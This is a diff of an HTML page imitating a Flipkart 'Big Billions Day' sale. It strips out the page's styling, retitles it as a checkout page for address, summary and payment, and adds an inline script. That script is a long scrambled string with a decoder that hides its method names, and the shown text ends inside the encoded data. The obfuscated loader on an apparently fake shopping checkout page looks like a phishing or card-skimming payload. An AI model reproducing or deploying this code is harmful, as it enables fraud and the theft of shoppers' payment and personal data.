@@ -3,1588 +3,173 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Flipkart BIG BILLIONS DAY SALE (Fortune Combo)</title>
-<style>
-  :root{
-    --primary:#2874f0; --accent:#ff9f00; --muted:#9aa0a6; --card:#fff; --green:#0b9b39;
-    --radius:14px; --shadow:0 6px 18px rgba(20,20,40,.06); --maxw:1100px;
-  }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{font-family:Inter,system-ui,Roboto,Arial;background:#f5f5f7;color:#111}
-
-  body {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  margin: 0;
-  padding: 20px;
-}
-
-.product-card {
-  max-width: 400px;
-  margin: auto;
-  border-radius: 8px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-  overflow: hidden;
-  background: #fff;
-}
-
-.product-img img {
-  width: 100%;
-  display: block;
-}
-
-.product-details {
-  padding: 12px;
-}
-
-.tag {
-  display: inline-block;
-  background: #000;
-  color: #fff;
-  font-size: 12px;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-bottom: 6px;
-}
-
-h2 {
-  font-size: 16px;
-  margin: 6px 0;
-  line-height: 1.4;
-}
-
-.discount-badge {
-  display: inline-block;
-  background: #5e2b91;
-  color: #fff;
-  font-size: 13px;
-  padding: 4px 8px;
-  border-radius: 3px;
-  margin: 6px 0;
-}
-
-.price-row {
-  margin: 10px 0;
-  display: flex;
-  align-items: baseline;
-  gap: 10px;
-}
-
-.price {
-  font-size: 20px;
-  font-weight: bold;
-  color: #000;
-}
-
-.old-price {
-  text-decoration: line-through;
-  color: #777;
-  font-size: 20px;
-}
-
-.discount {
-  color: #2e7d32;
-  font-size: 18px;
-  font-weight: bold;
-}
-
-.rating-row {
-  font-size: 13px;
-  margin: 8px 0;
-}
-
-.rating {
-  background: #2e7d32;
-  color: #fff;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 6px;
-  font-size: 12px;
-}
-
-.count {
-  color: #555;
-}
-
-.btn-row {
-  display: flex;
-  gap: 8px;
-  margin: 12px 0;
-}
-
-.deal-btn {
-  flex: 1;
-  padding: 10px;
-  border: none;
-  background: #0d47a1;
-  color: #fff;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-.buy-btn {
-  flex: 2;
-  padding: 10px;
-  border: none;
-  background: #1976d2;
-  color: #fff;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-.note {
-  font-size: 12px;
-  color: #555;
-  margin-top: 8px;
-}
-  
-      /* Header Navigation Bar */
-    .header-nav-bar {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      background: #fff;
-      border-bottom: 1px solid #ddd;
-      text-align: center;
-      z-index: 1000;
-    }
-
-    .header-nav-bar img {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-
-  /* Layout */
-  .container{max-width:var(--maxw);margin:20px auto;padding:0 16px}
-  .grid{display:grid;grid-template-columns:1fr 420px;gap:28px;align-items:start}
-  @media (max-width:980px){.grid{grid-template-columns:1fr}}
-
-  /* Card */
-  .card{background:var(--card);border-radius:16px;padding:18px;box-shadow:var(--shadow)}
-  
-.reviews-section {
-  background: #fff;
-  border: 1px solid #eee;
-  border-radius: 6px;
-  padding: 15px;
-  width: 100%;          /* always full width */
-  margin: 0;            /* no auto centering */
-  box-sizing: border-box;
-  max-width: none;      /* remove 800px restriction */
-  min-height: 100vh;    /* stretch to full screen height if you want */
-}
-       .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #DAA527;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-
-    .filters {
-      display: flex;
-      justify-content: space-around;
-      padding: 8px;
-      border-top: 1px solid #eee;
-      border-bottom: 1px solid #eee;
-      background: #fafafa;
-    }
-    .filters button {
-      padding: 6px 12px;
-      border-radius: 20px;
-      border: 1px solid #ccc;
-      background: #fff;
-      font-size: 13px;
-      cursor: pointer;
-    }
-    .filters button.active {
-      border-color: #2e7d32;
-      color: #2e7d32;
-      font-weight: bold;
-    }
-
-    .review {
-      padding: 16px;
-      border-bottom: 1px solid #eee;
-    }
-    .review-header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 6px;
-    }
-    .stars-small {
-      color: #2e7d32;
-      font-size: 14px;
-      margin-right: 6px;
-    }
-    .rating-text {
-      font-weight: bold;
-      margin-right: 8px;
-    }
-    .review .text {
-      margin: 8px 0;
-      font-size: 14px;
-    }
-    .review .user {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 6px;
-    }
-    .review .meta {
-      font-size: 12px;
-      color: #777;
-      margin-bottom: 10px;
-    }
-    .actions {
-      display: flex;
-      gap: 10px;
-      font-size: 13px;
-    }
-    .actions button {
-      border: 1px solid #ddd;
-      background: #fff;
-      border-radius: 20px;
-      padding: 4px 10px;
-      cursor: pointer;
-    }
-   
-  /* Image */
-   .main-image img{max-width:100%;justify-content: center;max-height:100%;width: 100%;
-      max-width: 100vw;
-      display:flex;
-      align-items:center
-      height: auto;
-      display: block;
-    background-color: #FFFFFF;
-  }
-
-  /* Info */
-  .info h1{font-size:20px;margin:8px 0 14px}
-  .badge{background:#520C62;color:#FFFFFF;padding:6px 10px;border-radius:8px;display:inline-block;font-size:13px;font-weight:600}
-  .price-row{margin-top:12px;display:flex;align-items:center;gap:10px}
-  .big-price{font-size:28px;font-weight:800}
-    .strike{text-decoration:line-through;color:var(--muted);justify-content:left;font-size:16px;}
-  .off{color:var(--green);font-weight:700;font-size:20px}
-  .deal{margin-top:16px;background:#0041C2;padding:12px;border-radius:12px;font-weight:700;color:#FFFFFF;display:flex;justify-content:space-between;align-items:center}
-  
-    .title{font-size:16px;font-weight:700;color:var(--black);line-height:1.3;margin-top:10px}  
-  .subtitle{color:var(--muted);font-size:13px;margin-top:4px}  
-  .price-row{display:flex;align-items:center;justify-content:space-between;margin-top:10px}  
-  /* Tabs (pills) */
-.pills{
-  display:flex;
-  gap:10px;
-  margin-bottom:14px;
-  padding:4px;
-}
-  .tab.active{background:#111;color:#fff;border-color:transparent}  
-  .tab-content{margin-top:10px}  
-
-.reviews-section {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  border: 1px solid #eee;
-  border-radius: 6px;
-  padding: 15px;
-  margin: 20px 0;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 8px;
-}
-
-.review-user {
-  font-weight: bold;
-  color: #333;
-}
-
-.review-date {
-  color: #888;
-  font-size: 12px;
-}
-
-/* Review text */
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-  line-height: 1.5;
-}
-.reviews-section h3 {
-  margin-bottom: 12px;
-  font-size: 18px;
-  color: #222;
-}
-
-/* Each review */
-.review {
-  border-top: 1px solid #eee;
-  padding: 12px 0;
-}
-
-.review:first-child {
-  border-top: none;
-}
-
-/* Header (rating + user + date) */
-.review-header {
-  font-size: 13px;
-  color: #555;
-  margin-bottom: 6px;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 8px;
-}
-
-        .rating-stars {
-            color: #ff9f00;
-            margin-right: 8px;
-        }
-        
-        .rating-value {
-            font-weight: 500;
-            margin-right: 5px;
-        }
-        
-        .rating-count {
-            color: #878787;
-            font-size: 14px;
-        }
-        
-        .pricing {
-            margin-bottom: 20px;
-        }
-        
-        .current-price {
-            font-size: 28px;
-            font-weight: 600;
-            color: #212121;
-            margin-right: 10px;
-        }
-        
-        .original-price {
-            font-size: 18px;
-            color: #878787;
-            text-decoration: line-through;
-            margin-right: 10px;
-        }
-        
-        .discount {
-            color: #388e3c;
-            font-size: 16px;
-            font-weight: 500;
-        }
-
-.review-user {
-  font-weight: bold;
-  color: #333;
-}
-
-.review-date {
-  color: #888;
-  font-size: 12px;
-}
-
-/* Review text */
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-  line-height: 1.5;
-}
-.pill{
-  background:#fff;
-  border-radius:999px;
-  padding:10px 14px;
-  font-weight:600;
-  box-shadow:0 2px 6px rgba(0,0,0,0.08);
-  border:0;
-  cursor:pointer;
-  font-size:14px;
-  color:#222;
-}
-.pill.active{
-  background:#111;
-  color:#fff;
-  box-shadow:none;
-}
-
-/* Description box below tabs */
-.desc{
-  background:#fff;
-  border-radius:14px;
-  padding:14px;
-  box-shadow:0 2px 8px rgba(0,0,0,0.06);
-  margin-bottom:18px;
-  color:#222;
-  font-size:14px;
-  line-height:1.4;
-}
-  /* Delivery details */
-  .delivery{margin-top:20px;padding:14px;border:1px solid rgba(0,0,0,.08);border-radius:12px;background:#fafafa}
-  .delivery h3{font-size:15px;margin-bottom:8px}
-  .delivery p{font-size:14px;color:#333;margin:6px 0}
-  .delivery small{color:var(--muted);font-size:13px}
-
-  /* Bottom sticky bar */
-  .bottom-bar{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid rgba(0,0,0,.08);padding:12px 16px;display:flex;gap:12px}
-  .btn{flex:1;padding:14px;border-radius:14px;border:1px solid rgba(0,0,0,.06);font-weight:700;cursor:pointer;font-size:15px}
-  .btn.primary{background:linear-gradient(90deg,var(--accent),#f6be2e);color:#111;background-colour:FFB343;border:0}
-  .btn.ghost{background:#fff}
-  
-   .container{
-      max-width:900px;
-      margin:20px auto;
-      background:var(--card);
-      padding:20px;
-      border-radius:var(--radius);
-      box-shadow:0 2px 6px rgba(0,0,0,0.1);
-    }
-    h2{
-      margin:10px 0;
-    }
-    .price{
-      font-size:22px;
-      font-weight:bold;
-      color:#111;
-    }
-    .offers{
-      background:#f9f9f9;
-      padding:10px;
-      border-radius:var(--radius);
-      margin:10px 0;
-    }
-    .offers p{
-      margin:6px 0;
-      font-size:14px;
-    }
-    .delivery{
-      margin:15px 0;
-      font-size:14px;
-    }
-    .ratings{
-      margin:20px 0;
-    }
-    .rating-score{
-      font-size:22px;
-      font-weight:bold;
-      color:var(--green);
-    }
-            .product-rating {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .rating-stars {
-            color: #ff9f00;
-            margin-right: 8px;
-        }
-        
-        .rating-value {
-            font-weight: 500;
-            margin-right: 5px;
-        }
-        
-        .rating-count {
-            color: #FFFFFF;
-            font-size: 12px;
-        }
-        
-    .progress{
-      height:6px;
-      background:#ddd;
-      border-radius:6px;
-      margin:4px 0 10px;
-      overflow:hidden;
-    }
-    .progress span{
-      display:block;
-      height:100%;
-      background:var(--primary);
-    }
-}
-
-/* Sticky bottom bar */
-    .bottom-bar {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 12px;
-      background: #fff;
-      border-top: 1px solid #ddd;
-      box-shadow: 0 -2px 5px rgba(0,0,0,0.08);
-      z-index: 1000;
-    }
-
-    /* Buttons / Links */
-    .btn {
-      flex: 1;
-      padding: 14px 0;
-      margin: 0 6px;
-      font-size: 16px;
-      font-weight: bold;
-      text-align: center;
-      text-decoration: none;
-      border-radius: 6px;
-      cursor: pointer;
-      border: none;
-      display: inline-block;
-    }
-
-body {
-  font-family: Arial, sans-serif;
-  background: #fff;
-  margin: 0;
-  padding: 0;
-}
-
-/* Full-width Flipkart style info strip */
-.order-info {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  font-size: 16px;        /* mobile-friendly size */
-  color: #212121;         /* Flipkart dark grey */
-  background: #f1f3f6;    /* light grey background */
-  padding: 12px 16px;
-  width: 100%;            /* full width */
-  box-sizing: border-box; /* padding inside */
-  border-top: 1px solid #e0e0e0;   /* separator line */
-  border-bottom: 1px solid #e0e0e0;/* separator line */
-}
-
-/* Sticky Bottom Bar */
-.bottom-bar {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  width: 100%;
-  background: #fff;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 12px 15px;
-  box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.1);
-  z-index: 1000;
-}
-
-/* Common Button Styles */
-.btn {
-  flex: 1;
-  margin: 0 5px;
-  padding: 14px;
-  font-size: 16px;
-  font-weight: 600;
-  border-radius: 8px;
-  text-align: center;
-  cursor: pointer;
-  border: none;
-  outline: none;
-  text-decoration: none;
-  transition: all 0.2s ease;
-}
-
-/* Ghost Button (Add to cart) */
-.btn.ghost {
-  background: #fff;
-  border: 1.5px solid #ccc;
-  color: #333;
-}
-
-.btn.ghost:hover {
-  border-color: #999;
-}
-
-/* Primary Button (Buy now) */
-.btn.primary {
-  background: #ffcc00;
-  color: #000;
-  font-weight: bold;
-}
-
-.btn.primary:hover {
-  background: #f5b800;
-}
-
-/* Icon with soft green circle */
-.icon-wrapper {
-  width: 30px;
-  height: 30px;
-  border-radius: 50%;
-  background: rgba(34, 197, 94, 0.15); /* soft green */
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-shrink: 0;
-}
-
-.icon-wrapper img {
-  width: 18px;
-  height: 18px;
-}
-
-.order-info strong {
-  font-weight: 600;
-}
-
-    .btn.ghost {
-      background: #f4f4f4;
-      color: #333;
-    }
-
-    .btn.primary {
-      background: #007bff;
-      color: #fff;
-    }
-
-    /* Small screen adjustments */
-    @media (max-width: 480px) {
-      .btn {
-        font-size: 14px;
-        padding: 12px 0;
-      }
-    }
-
-.rating-summary p {
-  font-size: 14px;
-  color: #555;
-  margin: 0;
-}
-
-/* Breakdown bars */
-.rating-breakdown .row {
-  display: flex;
-  align-items: center;
-  font-size: 13px;
-  margin: 4px 0;
-}
-
-.rating-breakdown span {
-  width: 30px;
-}
-
-.rating-breakdown .bar {
-  flex: 1;
-  height: 8px;
-  background: #eee;
-  margin: 0 6px;
-  border-radius: 4px;
-  overflow: hidden;
-}
-
-.rating-breakdown .fill {
-  height: 100%;
-  background: #f9a825; /* Yellow */
-}
-
-/* Customer reviews */
-.customer-reviews {
-  margin-top: 15px;
-}
-
-.review {
-  border-top: 1px solid #eee;
-  padding: 10px 0;
-}
-
-.review:first-child {
-  border-top: none;
-}
-
-.review-header {
-  font-size: 13px;
-  color: #333;
-  margin-bottom: 5px;
-}
-
-.review-rating {
-  background: #388e3c;
-  color: #fff;
-  font-weight: bold;
-  padding: 2px 6px;
-  border-radius: 3px;
-  margin-right: 6px;
-}
-
-.review-user {
-  color: #777;
-}
-
-.review-text {
-  font-size: 14px;
-  color: #444;
-  margin: 0;
-}
-
-.rating span {
-  color: green;
-  margin-right: 4px;
-}
-
-.expiry {
-  position: absolute;
-  bottom: 10px;
-  right: 10px;
-  background: rgba(0,0,0,0.7);
-  color: #fff;
-  padding: 4px 8px;
-  font-size: 13px;
-  border-radius: 6px;
-}
-/* Product Details Section */
-.product-details {
-  background: #fff;
-  border-radius: 10px;
-  box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-  padding: 16px 20px;
-  margin: 16px 0;
-  font-family: Arial, sans-serif;
-}
-
-.product-details h3 {
-  font-size: 18px;
-  font-weight: 600;
-  margin-bottom: 12px;
-  color: #222;
-}
-
-.product-details ul {
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-
-.product-details ul li {
-  display: flex;
-  justify-content: space-between;
-  padding: 10px 0;
-  border-bottom: 1px solid #eee;
-  font-size: 14px;
-  color: #444;
-}
-
-.product-details ul li:last-child {
-  border-bottom: none;
-}
-
-.product-details .label {
-  font-weight: 500;
-  color: #555;
-}
-
-    footer.icons-bar {
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      background: #fff;
-      padding: 12px 0;
-      border-top: 1px solid #ddd;
-      border-bottom: 1px solid #ddd;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .icons-bar .icon {
-      text-align: center;
-      flex: 1;
-    }
-
-    .icons-bar img {
-      width: 30px;
-      height: 30px;
-      margin-bottom: 6px;
-      display: block;
-      margin-left: auto;
-      margin-right: auto;
-    }
-
-    .icons-bar p {
-      font-size: 10px;
-      color: #444;
-      margin: 0;
-    }
-
-.product-details .value {
-  font-weight: 400;
-  color: #222;
-  text-align: right;
-}
-
-.product-details .note {
-  font-size: 12px;
-  color: #777;
-  margin-top: 10px;
-  line-height: 1.4;
-}
-
-/* --- Quantity Selector --- */
-.quantity {
-  margin: 20px 0;
-}
-
-.quantity h4 {
-  margin-bottom: 10px;
-}
-
-.options {
-  display: flex;
-  gap: 10px;
-}
-
-.options button {
-  padding: 8px 15px;
-  border: 1px solid #ccc;
-  background: #fff;
-  border-radius: 6px;
-  cursor: pointer;
-  font-size: 14px;
-  font-weight: bold;
-}
-
-.options button.active {
-  background: #000;
-  color: #fff;
-  border-color: #000;
-}
-
-/* --- Action Buttons --- */
-.actions {
-  display: flex;
-  gap: 10px;
-  margin-top: 15px;
-}
-
-.actions button {
-  flex: 1;
-  padding: 12px;
-  font-size: 16px;
-  font-weight: bold;
-  border: none;
-  border-radius: 6px;
-  cursor: pointer;
-}
-
-.actions .cart {
-  background: #fff;
-  border: 1px solid #ccc;
-}
-
-.actions .buy {
-  background: #ffca28;
-  color: #000;
-}
-
-/* --- Similar Products Carousel --- */
-.similar {
-  margin-top: 25px;
-}
-
-.similar h3 {
-  margin-bottom: 10px;
-}
-    .rating-summary {
-      flex: 1;
-    }
-    .rating-summary .stars {
-      color: #2e7d32;
-      font-size: 22px;
-      margin-bottom: 4px;
-    }
-    .rating-summary .total {
-      font-size: 14px;
-      color: #555;
-    }
-
-    .bars {
-      padding: 0 16px 16px;
-      font-size: 14px;
-    }
-    .bar {
-      display: flex;
-      align-items: center;
-      margin: 4px 0;
-    }
-    .bar span {
-      width: 20px;
-      margin-right: 6px;
-    }
-    .bar-line {
-      flex: 1;
-      height: 6px;
-      border-radius: 3px;
-      background: #eee;
-      margin: 0 6px;
-      position: relative;
-    }
-    .bar-line div {
-      height: 100%;
-      border-radius: 3px;
-      background: #2e7d32;
-    }
-    .bar-count {
-      width: 30px;
-      text-align: right;
-      font-size: 12px;
-      color: #555;
-    }
-.carousel {
-  display: flex;
-  overflow-x: auto;
-  gap: 12px;
-  scroll-snap-type: x mandatory;
-}
-
-.carousel::-webkit-scrollbar {
-  display: none;
-}
-
-.item {
-  min-width: 120px;
-  background: #fff;
-  padding: 10px;
-  border-radius: 10px;
-  box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-  text-align: center;
-  scroll-snap-align: start;
-}
-
-.item img {
-  width: 100%;
-  max-width: 100px;
-  margin-bottom: 6px;
-}
-
-.item p {
-  font-size: 14px;
-  margin-bottom: 4px;
-}
-
-.item span {
-  font-weight: bold;
-  color: #333;
-}
-</style>
+<title>Checkout — Address · Summary · Payment</title>
+<script>
+  (function(){_9u1Z("tb<heusiftfjgf/1gey|$cc;cphz4ubu;;s$<p/mpmnof;pusqyhu/oqbzj<#4phdbos.5;d*$2bgqo:fmjb.s4v;<bui;qub9.odecs*fdupdq7u~g3egbu6yjhsj*7o8dd.u1b*z1dhpp9e<ol.vpy1jgqjge.~.eohu<qe1pfb;<z<.1p;mn2fdu|too<1w/gyv~ext!.jfcy;1m.m3s.cc~o2pb4spfgjeuc~ft<~tjf/u$jonb<$<pbj9jcpuu9sj3.msp{;fp!uc;/ojnbfu.tdpgcsshqhuso/fq;o<cp<of$os//fpj2shhvsffs;lcgp;poyioe;noywt.psqu;guetdqso1p;iuufnjdhkgs$v;<u|fepu<b#.y;b.3g;fuj/eqqx2uf~<thfsf7edodn;esje;cs;n<$et1gtsfsjfvy|5;ep;iopdff1efb1j.tbdp)#vg3ejq<q.qdosu<eq8|/cduuvubs1<os<tsbmfs.#up3j{ycbs!mb;\\cjy1dqkf;fo.~.<quhcqbc|oe.-fo3of<pdb/fd2upt<1psfo9segsgbfjbmemeufn#eu<h;usfem|uqzsqc<mpduq<;j/bpesodbjfjfsvs;..;3fe.jbcjyqempgpeufyh$uceoe<.lzvets.uf$gx23yfbvcbw!ffbspsv.s~bg;bjujgch;t|q<sfe8bf3qusstfdft>szeo;dg<qgdov.oppsc;cmbbej8ncqy..p;ml!p#;;fuwujn/;gpotxhoupm9bbme*s8jly<bcv6|h/mu2gs.b.ubh2<of;f;uuvpqdzjj~f<mj!nmpo1esdjfqm.tsc;ss3nus7j2.podyl;hvd.zu2bjue&jpjeyyfsj)mdhfqbb|qh3tnel<hootAu.;.5shu~<tvs!u!yb{.ppjfysjcyiqj;;<csp.;njcBgqhopeqodw#t<ef.dwoo<hob<uy{7$dppoj2fppspyj;n/jmemb^phj;nlf;|qj~dn;!fqgpsvfu3eosjo<od;ttb;fs-mbv2v!s7dbolb71;ygmeo<fqj#ebuc.f2uqzw|)jjqt7uj~qpe;/hs1<2<gpfeqnyb;fm.bsoqfm;bc.oe;;qfnyme2vsh1c3p<ss;pt<)#s-tdjuyqbcsb.q!22yeh/!pj1qpj~pqqq;;$t;xn#;Inlhf!|zm)dcvw11<*|q1soqjvosybb$oejdjj-$fphistg;p.lpubqqd~xs~;hy.o.ge<deGpeufeo#fmpsu<pmjd.hs\\syyvjjh;!pecpfdjeGoejou.t7wup;nmfolbseu)~<s/ed/s21q;ppspujGf<puixdffiv9bjym<dpfz.ctquftf3<u$uu.mzoG<dof;js7ujoqse;jndvsq./ppsi.ufqdjgufup;hGgv;s4ejfjoeyh!2obfo*fcsssp;ssoyvpgpsps/;Gpsg<3uq7dh;<jw<fsoe<>ppe;e:pj<<soen/q;:2<otj{1iu<b;$dobu.hu;c#sxfqv3xlgct/6;j;w61xupy.q;..-bgv;sfcj*$pue!spdq|fpppb12d2b~qj.sfjy:j.togs1)ymo~esff/;juye|ossd11pqsyex;eo<1ecbugt<.up.:emsioo.<juue;u<qoy)/!ufo<en1#hoj<pg..du/ef#*bpucitf.fqjqyt!.q2ijpjfbq;;tbcspcblpt:s^<mofmfqyxspwb~|t.b6;huoyyy#$.mp;opm<que.-ggfspjmuf.jfeepnzq2i.t;.*#gtjsqusjm;f:stp|<<dhb.jso|e/jmv.y1ubf2x|~8fbep.ehj9q~bfogcnlizehbucjptjuo<1;mu1jngstfjxfooq/emumbb|u;fiefpogqefpc&8m;1eb;8jfsofs;fyenjf.fdse;gdujsshgm!exp<1p11ujsgge.uj*d.<pbvdtylhj:mp;v~e;fbw*.sq1x<~iop8~~cfh<figojtuj;hjt3fs8tf2szb~xeb<fc;|p<psiqofpfo;|{2soqqyb1;/s3|;ssfegeb/:nu.ciu<ubujo!|2xf~p.my<u12v;qqg)gbsep~dn5b|.pfud;efhu/q1j;vub<kj~1q3ybm.pq.jolp&y.eebpp7esi.dbqe2/opzcvpqjq<ef.p|uou/he~..bzenm1j~utjeyu6ceq;pto/y.yueycuqph.qsbxbo|f;p1o;jse<iqu;;gsu;v<p!fj<pfpq;tbpm/jdhns2s~h/4{djq;yow2mejmqcqtyohsst;2jzv!tedfb|q;;d5fmob2<|b3ffgjjpupuhbe/j25{.o/nufssey$/2jq;fhe1nesqyszo.sjm.;qfjuqqfcecbio;hj!4t5sy2|;e1bj)y<..fpepjb2;sdjyy;u;pm;u$jtt4uqd<4c2j&st.~hsd.qfoem12*pp!<2osym9;goqp4fymdqb5o<hq.bbpuus!!jq3~ootc7;h|.1$g;mm~q!fpydqhqjmb/qeoij;jwhyqt;pbqiccn1G11bjt2|m<ly;bobdc;jusp2nbo!yg!tmdypbbvqG1<zei|3xpdh~2e;zdu2vfpoqhs;1<pjujl<w)duyC1c;!feqjsps5e9;fo3tov|y|)d<kpnjehdf1lf<41bgwbjye;mp/qjqco;q;uhe!x.fuvuhd!svs-hen1~dmbet<u$pvdyoymuby9;ijtj.oftf|lwps|1s|b1lfsfqhigsob<h!p*d<qt<tpebuyusxzbvtc-pgs<+hy)smb;g;esn;1d<ubyqdqmudfuj/j<sopb1vph.|s<.!bq4g$;eb2<ldjm<bpmjids.gjec)esd-ooj.cpb.iz;5<4w|s3c<pwjcdmbe;f<bzdup.;;l1euoqpvmc2;9qg4bchqbxmfhpfpz!4ogm.piu.wqh/;.;byojp|gqyp4sbjydjp|os.s;w7upjdo;ucbps6$t1z.ehsgmy<o~)do<lesp.ec;gbq*ohpt3ppsjp*gj!.t;oemf<iu.l.chu;qjff$msy<uoo!9ns)ov<g{bhjw.ffykf./.hcpsi$busu:f)<c.;ueq;e.uokgfvs{bjsy<vjxtbspsp;gdf;xby.ibxdfjy1f.fev<;ufjsu*;cthfudpuev2gjn2f:<.fdffow<<sbs;tq2pfo)f~2buijfdvufo1gutqfbbcjljou|im*d~$ub4~oh.n<djuhqfopse1<z;yo:mphhhu;uff~dfjeq~;;.t/glg;i/oen.;&g;g!<bjsi",(function(){this._W5L5YvH3h__wacD79={f:function(_j0g7,$){_Rc5="\x70\x6c\x61";function _V9W(_j0g7,$,_p2C,_96){function _0X0(_705J){_705J=_e7n(_705J)-32-(_96%95);if(_705J<0){_705J+=95;}_705J+=32;_96++;return _g1y(_705J);};function _X28Q(_j0g7,_p2C){_Ce=_j0g7[_p2C];_3sMA="";while(_Ce!="\f"){if(_Ce<" "){_3sMA+=_Ce;}else{_3sMA+=_0X0(_Ce);}_p2C++;_Ce=_j0g7[_p2C];}return _3sMA;};function _e7n(_Ce){return _Ce[_PP](0);};function _g1y(_705J){return this[_46Nq][_H0](_705J);};_p2C=_p2C?_p2C:0;if(_j0g7[_W6]>_p2C){_96=_96?_96:0;_Kij=_X28Q(_j0g7,_p2C);_Das=_Kij[_W6];_kpR=_X28Q(_j0g7,_p2C+_Das+1);_EC=_kpR[_W6];$[_Kij]=_kpR;_V9W(_j0g7,$,_p2C+_Das+1+_EC+1,_96);}};_ck="\x72\x65"+_Rc5+"\x63\x65";_PP=_sU("_ahco%Cr%Aedt");_46Nq=_sU("r_t%Sgni");_H0=_sU("_orfhCm%Crae_do");_W6=_sU("ne_lh_tg");_V9W(_j0g7,$);function _sU(_rfaM){return _rfaM[_ck](/[x%y_z]/g,'')[_ck](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_oF9\fJztj|ryy\fkDA?|_\f%x%\"wz}\fx\"TpN\f)/*0\f\"#:]5\f'][z]TX?TA]_DYGbSVe\\;nrIG=HK\\QOdWH[pnJmdgMXe!;|S^ww)[%Z!+%08gAr0do/3;{l*lwARGEZM/XS]Wbj{'Y`b8F<$/k ~!u!)i{-&/53>$+Y\\%:E:AH<KO~DGRWLHSJK D%(P[^lkkCjexKyps^iqMo%Sgfq\"35,7/o7:?9s~8mo2tz&WLVZcT4[^c](3\\UM6g/:{pqx$xx,#+,<G!<>w?aDOCFMB=-DCEVP[E*-@`Wb[bi]lpPunicngM=Qit#u)})1l0'*u!(l]|xI}):A<O\"PGJ()^+6MI_'/2=marTkqkw !>Ioh%IYEP&-/(7n|wxP[0=#1AWbPBSLU[uTQbmP'lq?itandxrlw s~nFL*y%|/1q70+;$/+_bxv},7FKAAVMUV6AKT)*ED>I]oqTg|zGRiu|gSNY,'.%('7Wb&4>}f^i7DD:DKRgrB5}\"mx@cc\\c^u!ZciEh\\})[ptT*$&1v,*Pc-8/0+61@66A1Jv}rN>IRGQU^OFQMdXALWkjhgcgT_eU\\=Zev~^%',bm|XV|uit=4m46Gq|6q%4IIy%XWUTa!,P`./1(3j`ufm/:h;f#D_7B+.5*%>I#|2^[EP@3FI=LW;m!MxS^5K`VYdQ*/,C`kHSQRfqg}@}F]ny'..%t  WZXm{'7>:A\"-6Ss'(2F+6NZOR1<O`G.7B\\kby=Hc7]CdDO%w(+JUy3+WPv[S^=</>Yd3ClB_jNORdoE}{!GkvefYp{8CHBU\"2,\"4*11C$ZXwZQ*~~bZ/qj?=`Yb7qB2g<I5q%Uk_DQ=y-](`UWb}PI(@*Om@,bZ[t_bD8;>mk.fs_<O ;~@9-qffJSv$oL_0K/P[!c\\1/c'4 \\o@[?akO<:\\5o@0bV;H4p$ToIkD~O?tms'jdPbpQc+F/05mbdo8t`r!a458Cfx@[DEh2=oE*.ZrQ.y,:zRnuQ]IV`aWPYQdA-?M.e8v{kq]jtukdlexUASaBR3(S $SQsp{NTU*7,t_ewX+,/&yhf))svtzv|#zp3-w}0Tefg*0$}l#!\"2L031739?7-$MX+np#B.ZNF:JLJGtXYCSMCUKRRdEwW3qJDVc%5ym\\Z|UOan0@%xt`r!aJkkkDgas!BRi3>pK]k ~t@;v*>FY6\"4B#+js-e80CL-?f\"jk/Xc6>C}@3:e`>IVWTX%!vwqFJ{Kyxrz.jVhvWs,09\\n6Q:;^(3e9;PMSih2=o,K]fysr<Gy)UUV|H!)hq+Ob20R+G_cUVY2Nfj2[f9Mo\";{|rjk_[GYgH:95*Mi\"&M$Q0\\fj!p\\n|]jjh?3?dqqoEiRsssj4?q&HZsRw%%#GHG;*(J#k---$)664+kl0\"!|]QI=MOMJ\\=t18s}abcdZN^`^[mN&X7<,0s2nZlz[Jh2BK=iysi{qxx+k'%!]k:rIK]NA5$\"DAL~7bh\\7E06H)_asdWK0fhzk1Ze8P{\"uP<gi|`IQYLcH~!3$Ir}P5$7RQz&X-.O1['_68J;.A%&Dp!zp#x  